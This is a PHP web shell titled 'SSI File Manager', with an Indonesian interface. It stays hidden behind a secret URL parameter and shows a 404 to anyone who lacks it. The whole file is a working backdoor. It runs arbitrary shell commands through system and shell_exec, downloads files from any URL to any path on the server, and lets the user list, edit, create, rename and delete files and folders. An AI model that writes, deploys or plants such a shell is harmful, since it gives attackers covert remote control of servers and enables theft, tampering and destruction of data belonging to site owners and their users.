<?php
if (!isset($_GET['nyenye']) || $_GET['nyenye'] !== 'ssi') {
    http_response_code(404);
    exit;
}

echo '
<html>
<head>
    <title>SSI File Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            font-family: "Poppins", sans-serif;
            background: url("https://nyenyeits.me/images/shell/api.png") no-repeat center center fixed;
            background-size: cover;
            color: #f0f0f0;
        }
        .container {
            background: rgba(0, 0, 0, 0.75);
            padding: 30px;
            max-width: 900px;
            margin: auto;
            margin-top: 30px;
            border-radius: 12px;
            box-shadow: 0 0 20px #fe8a18;
        }
        h1 {
            color: #fe8a18;
            text-align: center;
        }
        h3 {
            color: #0ff;
        }
        label {
            font-weight: 500;
        }
        form {
            margin-bottom: 25px;
        }
        input[type=text], input[type=url], textarea {
            width: 100%;
            padding: 10px;
            margin-top: 8px;
            border-radius: 6px;
            border: none;
            background: #222;
            color: #fff;
        }
        input[type=submit] {
            margin-top: 10px;
            background: #fe8a18;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            color: #000;
            font-weight: bold;
        }
        input[type=submit]:hover {
            background: #0ff;
        }
        pre {
            background: #111;
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
        }
        .logo {
            display: block;
            margin: auto;
            max-width: 150px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://nyenyeits.me/images/nick/tranparant.png" class="logo" alt="logo">
        <h1>SSI FILE MANAGER</h1>
';

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
echo "<h3>📂 Directory: <code>" . htmlspecialchars($dir) . "</code></h3>";
if (is_dir($dir)) {
    echo "<pre>";
    foreach (scandir($dir) as $file) {
        echo $file . "\n";
    }
    echo "</pre>";
} else {
    echo "<p>❌ Directory tidak ditemukan.</p>";
}

echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Lihat Direktori:</label>
    <input type="text" name="dir" placeholder="/path/to/folder" value="' . htmlspecialchars($dir) . '">
    <input type="submit" value="Cek">
</form>
';

if (isset($_GET['cmd']) && $_GET['cmd']) {
    echo "<h3>⚙️ Shell Output</h3><pre>";
    $cmd = $_GET['cmd'];
    if (function_exists('system')) system($cmd);
    elseif (function_exists('shell_exec')) echo shell_exec($cmd);
    else echo "Shell exec tidak tersedia.";
    echo "</pre>";
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <input type="hidden" name="dir" value="' . htmlspecialchars($dir) . '">
    <label>Perintah Shell:</label>
    <input type="text" name="cmd" placeholder="ls -la">
    <input type="submit" value="Jalankan">
</form>
';

if (isset($_GET['url']) && isset($_GET['save'])) {
    $file = @file_get_contents($_GET['url']);
    if ($file !== false) {
        $saved = @file_put_contents($_GET['save'], $file);
        echo $saved !== false ? "<p>✅ File berhasil disimpan ke {$_GET['save']}</p>" : "<p>❌ Gagal simpan file.</p>";
    } else {
        echo "<p>❌ Gagal download file.</p>";
    }
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Download File dari URL:</label>
    <input type="url" name="url" placeholder="https://example.com/file.txt">
    <label>Simpan sebagai:</label>
    <input type="text" name="save" placeholder="/path/save.php">
    <input type="submit" value="Download">
</form>
';

if (isset($_GET['rename_from']) && isset($_GET['rename_to'])) {
    if (@rename($_GET['rename_from'], $_GET['rename_to'])) {
        echo "<p>✅ Berhasil rename file.</p>";
    } else {
        echo "<p>❌ Gagal rename file.</p>";
    }
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Rename File:</label>
    <input type="text" name="rename_from" placeholder="/path/old.php">
    <input type="text" name="rename_to" placeholder="/path/new.php">
    <input type="submit" value="Rename">
</form>
';

if (isset($_GET['delete'])) {
    if (@unlink($_GET['delete'])) {
        echo "<p>✅ File berhasil dihapus.</p>";
    } else {
        echo "<p>❌ Gagal hapus file.</p>";
    }
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Hapus File:</label>
    <input type="text" name="delete" placeholder="/path/file.php">
    <input type="submit" value="Hapus">
</form>
';

// Fitur baru: Hapus Folder
if (isset($_GET['delete_folder'])) {
    if (@rmdir($_GET['delete_folder'])) {
        echo "<p>✅ Folder berhasil dihapus.</p>";
    } else {
        echo "<p>❌ Gagal hapus folder. Pastikan folder kosong dan path benar.</p>";
    }
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Hapus Folder:</label>
    <input type="text" name="delete_folder" placeholder="/path/folder">
    <input type="submit" value="Hapus Folder">
</form>
';

// Fitur baru: Rename Folder
if (isset($_GET['rename_folder_from']) && isset($_GET['rename_folder_to'])) {
    if (@rename($_GET['rename_folder_from'], $_GET['rename_folder_to'])) {
        echo "<p>✅ Berhasil rename folder.</p>";
    } else {
        echo "<p>❌ Gagal rename folder.</p>";
    }
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Rename Folder:</label>
    <input type="text" name="rename_folder_from" placeholder="/path/folder_lama">
    <input type="text" name="rename_folder_to" placeholder="/path/folder_baru">
    <input type="submit" value="Rename Folder">
</form>
';

if (isset($_GET['edit']) && isset($_POST['content'])) {
    if (@file_put_contents($_GET['edit'], $_POST['content'])) {
        echo "<p>✅ File berhasil disimpan ulang.</p>";
    } else {
        echo "<p>❌ Gagal simpan file.</p>";
    }
}
if (isset($_GET['edit']) && file_exists($_GET['edit'])) {
    $isi = htmlspecialchars(file_get_contents($_GET['edit']));
    echo '
    <form method="post">
        <h3>✏️ Edit File: ' . htmlspecialchars($_GET['edit']) . '</h3>
        <textarea name="content" rows="15">' . $isi . '</textarea>
        <input type="submit" value="Simpan File">
    </form>';
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Edit File:</label>
    <input type="text" name="edit" placeholder="/path/edit.php">
    <input type="submit" value="Buka">
</form>
';

if (isset($_GET['mkdir'])) {
    if (@mkdir($_GET['mkdir'], 0755, true)) {
        echo "<p>✅ Folder berhasil dibuat.</p>";
    } else {
        echo "<p>❌ Gagal membuat folder.</p>";
    }
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Buat Direktori:</label>
    <input type="text" name="mkdir" placeholder="/path/folderbaru">
    <input type="submit" value="Buat Folder">
</form>
';

if (isset($_GET['newfile']) && isset($_POST['newcontent'])) {
    if (@file_put_contents($_GET['newfile'], $_POST['newcontent'])) {
        echo "<p>✅ File baru berhasil dibuat: {$_GET['newfile']}</p>";
    } else {
        echo "<p>❌ Gagal membuat file baru.</p>";
    }
}
if (isset($_GET['newfile']) && !isset($_POST['newcontent'])) {
    echo '
    <form method="post">
        <h3>📄 Buat File Baru: ' . htmlspecialchars($_GET['newfile']) . '</h3>
        <textarea name="newcontent" rows="10" placeholder="Isi file di sini..."></textarea>
        <input type="submit" value="Buat dan Simpan">
    </form>';
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Buat File Baru:</label>
    <input type="text" name="newfile" placeholder="/path/baru.php">
    <input type="submit" value="Buat File">
</form>
';

echo '</div></body></html>';
?>
